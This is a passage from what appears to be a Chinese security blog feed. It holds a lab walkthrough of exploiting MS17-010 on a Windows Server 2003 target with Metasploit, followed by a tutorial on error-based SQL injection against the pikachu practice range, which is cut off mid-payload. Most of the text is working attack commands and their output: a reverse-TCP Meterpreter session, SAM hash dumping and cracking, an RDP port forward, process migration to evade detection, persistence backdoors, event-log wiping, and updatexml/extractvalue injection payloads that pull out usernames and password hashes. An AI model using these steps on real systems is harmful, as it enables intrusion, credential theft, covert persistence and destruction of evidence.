msfconsole</span><br></pre></td></tr></table></figure><p>查看当前所连接的数据库:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql connected to msf</span><br></pre></td></tr></table></figure><p>断开连接,连接我们刚刚创建的数据库,</p><p>断开数据库连接命令:db_disconnent</p><p>连接新的数据库:格式是db_connect 用户名:密码@127.0.0.1/数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_disconnect </span><br><span class="line">msf &gt; db_connect kkk:passwd@127.0.0.1/database1</span><br></pre></td></tr></table></figure><h4 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h4><p>这部分其实就是确认nmap扫描的结果是否准确,MSF提供专门扫描MS17-010的payload(载荷)我们可以在这里尝试一番,熟悉命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms17-010     //在漏洞库中搜索ms17-010的payload</span><br><span class="line">[!] Module database cache not built yet, using slow search</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                      Disclosure Date  Rank     Description</span><br><span class="line">   ----                                      ---------------  ----     -----------</span><br><span class="line">   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection</span><br><span class="line">   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure><p>我们使用auxiliary辅助模块中的ms17_010_command载荷去扫描确认目标系统是否真的有SMB服务的远程代码执行的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/smb/ms17_010_command    //使用该载荷</span><br><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.135.136   //设置目标</span><br><span class="line">rhosts =&gt; 192.168.135.136</span><br><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; exploit  //进行攻击</span><br><span class="line"></span><br><span class="line">[*] 192.168.135.136:445   - Target OS: Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[*] 192.168.135.136:445   - Filling barrel with fish... done</span><br><span class="line">[*] 192.168.135.136:445   - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445   - [*] Preparing dynamite...</span><br><span class="line">[*] 192.168.135.136:445   - Trying stick 1 (x64)...Miss</span><br><span class="line">[*] 192.168.135.136:445   - [*] Trying stick 2 (x86)...Boom!</span><br><span class="line">[*] 192.168.135.136:445   - [+] Successfully Leaked Transaction!</span><br><span class="line">[*] 192.168.135.136:445   - [+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 192.168.135.136:445   - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445   - Reading from CONNECTION struct at: 0x8fdf1cb0</span><br><span class="line">[*] 192.168.135.136:445   - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.135.136:445   - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[+] 192.168.135.136:445   - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] 192.168.135.136:445   - Output for &quot;net group &quot;Domain Admins&quot; /domain&quot;:</span><br><span class="line">ةĻ     Domain Admins</span><br><span class="line">עˍ     ָ¶¨µœꝀ</span><br><span class="line"></span><br><span class="line">³ʔ±</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            </span><br><span class="line">ļ®³ɹ¦Ϊ³ɡ£</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 192.168.135.136:445   - Cleanup was successful</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>Successful 而且目标为Administrator  权限</p><h4 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(admin/smb/ms17_010_command) &gt; use exploit/windows/smb/ms17_010_psexec //使用攻击模块</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.135.136 //设置目标</span><br><span class="line">rhost =&gt; 192.168.135.136</span><br></pre></td></tr></table></figure><p>对于ms17_010_psexec攻击脚本,不需要设置payload,我原先设置windows/x64/meterpreter/reverse_tcp</p><p>载荷一直不出来结果,后来才得知这个攻击脚本里面有meterpreter的载荷,无需设置即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; exploit   //开始攻击</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.135.134:4444 </span><br><span class="line">[*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2</span><br><span class="line">[*] 192.168.135.136:445 - Filling barrel with fish... done</span><br><span class="line">[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445 - [*] Preparing dynamite...</span><br><span class="line">[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss</span><br><span class="line">[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom!</span><br><span class="line">[*] 192.168.135.136:445 - [+] Successfully Leaked Transaction!</span><br><span class="line">[*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel</span><br><span class="line">[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;</span><br><span class="line">[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8f3e37c0</span><br><span class="line">[*] 192.168.135.136:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.135.136:445 - Selecting native target</span><br><span class="line">[*] 192.168.135.136:445 - Uploading payload...</span><br><span class="line">[*] 192.168.135.136:445 - Created \ZKbfdlYf.exe...</span><br><span class="line">[+] 192.168.135.136:445 - Service started successfully...</span><br><span class="line">[*] 192.168.135.136:445 - Deleting \ZKbfdlYf.exe...</span><br><span class="line">[-] 192.168.135.136:445 - Delete of \ZKbfdlYf.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2240) at 2019-02-19 19:13:26 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;           //攻击成功,拿到目标的会话</span><br></pre></td></tr></table></figure><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>先介绍一下Meterpreter:</p><blockquote><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。</p></blockquote><p>在后渗透阶段我们将使用Meterpreter进行攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help        //输入help命令可以查看在meterpreter模块下执行的命令</span><br><span class="line">meterpreter &gt; sysinfo      //查看系统信息</span><br><span class="line">Computer        : MYCOMPUTER</span><br><span class="line">OS              : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Architecture    : x86</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : LOUISNIE</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; getsystem   //提升到system权限</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump  //导出SAM数据库的内容</span><br><span class="line">Administrator:500:570ce399da1412abaad3b435b51404ee:b9d2d4955b330b503cc792eb6a55bb1f:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98e07fb45acadfe5febbf70690d16ae0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:18861c2baa27b5a9100c04acbbfa47d9:::</span><br><span class="line">IUSR_MYCOMPUTER:1108:e2e508b31b1336d2c996f97338db8790:03320631cb387004f82daec52f03935f:::</span><br><span class="line">IWAM_MYCOMPUTER:1109:fc512ee6de7b912f77747be12787d540:0f8f47aec1c4bc8897a81bce48cc20da:::</span><br><span class="line">MYCOMPUTER$:1005:aad3b435b51404eeaad3b435b51404ee:979f58fb772361956a63f2bc34036a09:::</span><br></pre></td></tr></table></figure><p>SAM简介:</p><blockquote><p>SAM是windows系统的一个系统用户账号管理文件。其全称为security account manager。Windows中对用户账户的安全管理使用了安全账号管理器SAM(security account manager)的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。</p><p>其文件位置：C:\windows\system32\config\SAM</p></blockquote><p>其格式是  用户名称:RID:LM-HASH值:NT-HASH:::</p><p>在Windows系统下,有两大hash,分别是LM HASH&amp;NT HASH</p><p>对于NT HASH,我们直接可以在cmd5网站进行解密,解密Administrator用户密码为redhat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell     //使用Windows下的DOS命令进行操作</span><br><span class="line">Process 3200 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [°汾 5.2.3790]</span><br><span class="line">(C) °爨̹Ԑ 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;mstsc    //由于nmap扫描时发现目标没有打开远程连接3389端口,所以我们使用目标主机的shell用mstsc命令打开远程连接</span><br><span class="line">mstsc</span><br><span class="line">C:\WINDOWS\system32&gt;exit  </span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; portfwd add -l 2222 -r 192.168.135.136 -p 3389  //反弹目标的3389端口到本地的2222端口并监听该端口</span><br><span class="line">[*] Local TCP relay created: :2222 &lt;-&gt; 192.168.135.136:3389</span><br><span class="line">meterpreter &gt; portfwd    //查看是否反弹成功</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote                Direction</span><br><span class="line">   -----  -----         ------                ---------</span><br><span class="line">   1      0.0.0.0:2222  192.168.135.136:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">root@kali:~# netstat -an | grep &quot;2222&quot;  //我们在kali查看2222端口是在监听状态</span><br><span class="line">tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN     </span><br><span class="line">root@kali:~# rdesktop 127.0.0.1:2222 //连接本地的2222端口反弹到目标的3389端口,即打开目标的桌面</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps  //查看系统进程</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0        NT AUTHORITY\SYSTEM           </span><br><span class="line"> 240   2792  mstsc.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\mstsc.exe</span><br><span class="line"> 264   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe</span><br><span class="line"> 292   808   explorer.exe       x86   0        LOUISNIE\Administrator        C:\WINDOWS\Explorer.EXE</span><br><span class="line"> 312   264   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe</span><br><span class="line"> 336   264   winlogon.exe       x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe</span><br><span class="line"> 384   336   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe</span><br><span class="line"> 396   336   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe</span><br><span class="line"> 452   1744  wuauclt.exe        x86   2        LOUISNIE\Administrator        C:\WINDOWS\system32\wuauclt.exe</span><br><span class="line"> 588   384   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM </span><br><span class="line"> </span><br><span class="line">meterpreter &gt; migrate 292 //将该会话和系统进程绑定,免杀.格式是:migrate PID</span><br><span class="line"> </span><br><span class="line">meterpreter &gt; execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互 -f用系统命令去执行</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kali 1569  //杀死进程,格式是:kali PID</span><br></pre></td></tr></table></figure><p>植入后门,维持控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; sessions  -i 2  //开启第二个会话</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run persistence - X -i 5 -p 4445  //-X指定启动的方式为开机自启动，-i反向连接的时间间隔</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3906/MYCOMPUTER_20190219.3906.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.239.145 LPORT=4445</span><br><span class="line">[*] Persistent agent script is 99619 bytes long</span><br><span class="line">meterpreter &gt; run persistence - X -i 5 -p 4445 -r 192.168.135.136</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3953/MYCOMPUTER_20190219.3953.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.135.136 LPORT=4445</span><br><span class="line">[*] Persistent agent script is 99670 bytes long</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; back </span><br><span class="line">msf &gt; use exploit/multi/handler    //使用exploit/multi/handler监听连入的backdoor</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp  //设置载荷</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.135.134  //设置将反弹到本地来</span><br><span class="line">lhost =&gt; 192.168.135.134</span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.135.134:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2364) at 2019-02-19 21:42:12 +0800</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.135.1</span><br></pre></td></tr></table></figure><p>或者我们可以使用metsvc模块来留下后门</p><p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p><ul><li><p>metsvc.dll</p></li><li><p>metsvc-service.exe</p></li><li><p>metsvc.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; sessions -i 2 //选择一个会话</span><br><span class="line">meterpreter &gt; run metsvc  //运行metsvc</span><br></pre></td></tr></table></figure><p>清除日志:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping 1 records from Application...</span><br><span class="line">[*] Wiping 26 records from System...</span><br><span class="line">[*] Wiping 2281 records from Security...</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;不断进步,直到羔羊变成雄狮!&lt;/blockquote&gt;&lt;/p&gt;
&lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth
      
    
    </summary>
    
      <category term="主机渗透" scheme="https://louisnie.github.io/categories/%E4%B8%BB%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机实验" scheme="https://louisnie.github.io/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>pikachu靶机之SQL注入手动测试</title>
    <link href="https://louisnie.github.io/2019/01/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/"/>
    <id>https://louisnie.github.io/2019/01/07/SQL注入之基于函数报错的信息获取/</id>
    <published>2019-01-07T15:38:28.000Z</published>
    <updated>2019-01-07T17:16:38.435Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。</blockquote></p><div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></div><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境:"></a>实验环境:</h3><p>pikachu靶机</p><h3 id="基于函数报错的信息获取"><a href="#基于函数报错的信息获取" class="headerlink" title="基于函数报错的信息获取"></a>基于函数报错的信息获取</h3><p>1.常用的报错函数updatexml(),extractvalue(),floor()<br>2.基于函数报错的信息获取(select,insert,update,delete)</p><h3 id="技巧思路"><a href="#技巧思路" class="headerlink" title="技巧思路:"></a>技巧思路:</h3><p>在MySQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息<br>select/insert/update/delete都可以使用报错来获取信息</p><h3 id="背景条件"><a href="#背景条件" class="headerlink" title="背景条件:"></a>背景条件:</h3><p>后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端</p><h3 id="updatexml函数使用方法"><a href="#updatexml函数使用方法" class="headerlink" title="updatexml函数使用方法"></a>updatexml函数使用方法</h3><p>updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数<br>updatexml()函数作用:改变(查找并替换)XML文档中符合条件的节点的值<br>语法:updatexml(xml_document,xpathstring,new_value)<br>第一个参数:XML文档的名称<br>第二个参数:XML文档的位置(路径),通过xpath定位 ,也可以是表达式,那么数据库便会将这个表达式去执行<br>第三个参数:new_value,string格式,替换查找到的符合条件的<br>注:xpath定位必须是有效的,否则会发生错误</p><h3 id="基于updatexml-报错进行信息获取"><a href="#基于updatexml-报错进行信息获取" class="headerlink" title="基于updatexml()报错进行信息获取"></a>基于updatexml()报错进行信息获取</h3><p>基于报错信息获取数据,必须要有报错信息的返回<br><img src="https://wx2.sinaimg.cn/large/0078beR7ly1fyyi6tu63qj313609hmxs.jpg" alt="image"></p><p>我们使用updatexml()函数构造报错,获取数据库信息<br>使用concat函数将两个字符串一起打印出来,concat中也可以执行表达式(函数)<br>0x7e:为~的16进制,其目的为避免信息不被系统去掉,将结果构造出完整的字符串<br>查看其数据库版本信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,version()),0)#</span><br></pre></td></tr></table></figure></p><p><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fyyi7hkmtnj30m708q74l.jpg" alt="image"><br>查看当前数据库信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fyyi81w8e3j30ls08k74k.jpg" alt="image"></p><p>查看当前数据库第一张表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&quot;pikachu&quot; limit 0,1)),0)#</span><br></pre></td></tr></table></figure></p><p>查出第一个表为httpinfo<br><img src="https://ws3.sinaimg.cn/large/0078beR7ly1fyyicr2lq7j30rz0dbaao.jpg" alt="image"></p><p>依次查询得到的表为httpinfo,membr,message,users,xssblind</p><p>查看users表的字段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1)),0)#</span><br></pre></td></tr></table></figure></p><p><img src="https://ws2.sinaimg.cn/large/0078beR7ly1fyyieczx8aj30oh0bxdg7.jpg" alt="image"><br>得到users表第一个字段为id,第二个字段为username,第三个字段为password,第四个为level</p><p>查看用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</span><br></pre></td></tr></table></figure></p><p>得到users表的用户名分别为:admin,pikachu,test<br><img src="https://wx1.sinaimg.cn/large/0078beR7ly1fyyifklgyej30ne0be3yu.jpg" alt="image"></p><p>查看其对应的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and updatexml(1,concat(0x7e,(select password from users  where username=&apos;admin&apos; limit 0,1)),0)#</span><br></pre></td></tr></table></figure></p><p>得到admin用户的经过MD5加密的值,<br><img src="https://ws1.sinaimg.cn/large/0078beR7ly1fyyighb282j30o008kgm0.jpg" alt="image"><br>解密为123456<br><img src="https://wx4.sinaimg.cn/large/0078beR7ly1fyyignjjvdj30mr08jt9k.jpg" alt="image"></p><h3 id="extractvalue-函数使用方法"><a href="#extractvalue-函数使用方法" class="headerlink" title="extractvalue()函数使用方法"></a>extractvalue()函数使用方法</h3><p>extractvalue()函数:从目标XML中返回包含所查询值的字符串<br>语法:ExtractValue(xml_document,xpath_string)<br>第一个参数:XML_document是string格式,为XML文档对象的名称,文中为Doc<br>第二个参数:XPath_string(Xpath格式的字符串)<br>XPath定位必须是有效的,否则会发生错误</p><h3 id="基于updatexml-报错进行信息获取-1"><a href="#基于updatexml-报错进行信息获取-1" class="headerlink" title="基于updatexml()报错进行信息获取"></a>基于updatexml()报错进行信息获取</h3><p>获取数据库信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and extractvalue (0,concat(0x7e,database()))#</span><br></pre></td></tr></table></figure></p><p><img src="https://ws4.sinaimg.cn/large/0078beR7ly1fyyioxufyjj30js0da3yx.jpg" alt="image"><br>其后续操作与updatexml函数操作一致,我就不继续写下去啦</p><h3 id="floor-函数使用方法"><a href="#floor-函数使用方法" class="headerlink" title="floor()函数使用方法"></a>floor()函数使用方法</h3><p>floor():MySQL中用来取整的函数.<br>使用floor函数必须要满足三个条件:<br>其SQL语句中存在count函数,rand函数,group by 这三个值才可以使用<br>其payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&apos; and (select 2 from (select 